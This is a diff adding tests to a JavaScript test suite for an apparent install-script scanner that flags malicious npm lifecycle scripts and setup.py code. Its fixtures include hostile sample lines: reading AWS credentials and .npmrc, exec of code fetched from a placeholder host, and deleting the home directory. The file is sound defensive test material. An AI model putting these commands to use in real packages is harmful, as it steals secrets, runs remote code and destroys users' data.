@@ -30,6 +30,14 @@ async function withPkg(scripts) {
   return f;
 }
 
+async function withSetup(source) {
+  const dir = tmp();
+  try {
+    fs.writeFileSync(path.join(dir, 'setup.py'), source);
+    return await new InstallGuardAgent().analyze({ rootPath: dir, files: [], recon: {}, options: {} });
+  } finally { cleanup(dir); }
+}
+
 describe('InstallGuardAgent — lifecycle scripts', () => {
   it('flags credential harvesting in preinstall', async () => {
     const f = await withPkg({ preinstall: 'cat ~/.aws/credentials && cp ~/.npmrc /tmp/x' });
@@ -127,5 +135,20 @@ backend-path = [".."]
     const rootPath = path.join(FIXTURES, 'safe-package');
     const f = await new InstallGuardAgent().analyze({ rootPath, files: [], recon: {}, options: {} });
     assert.equal(f.length, 0);
+  });
+
+  it('stays quiet on the local version-file exec idiom', async () => {
+    const f = await withSetup('exec(open("src/pkg/_version.py").read())');
+    assert.ok(!f.some((x) => x.rule === 'WORM_PYTHON_INSTALL_OBFUSCATED_EXEC'));
+  });
+
+  it('still flags exec of fetched content', async () => {
+    const f = await withSetup('exec(requests.get("https://example.invalid/payload").text)');
+    assert.ok(f.some((x) => x.rule === 'WORM_PYTHON_INSTALL_OBFUSCATED_EXEC'));
+  });
+
+  it('flags module-qualified pathlib home deletion', async () => {
+    const f = await withSetup('shutil.rmtree(pathlib.Path.home())');
+    assert.ok(f.some((x) => x.rule === 'WORM_PYTHON_INSTALL_DESTRUCTIVE'));
   });
 });
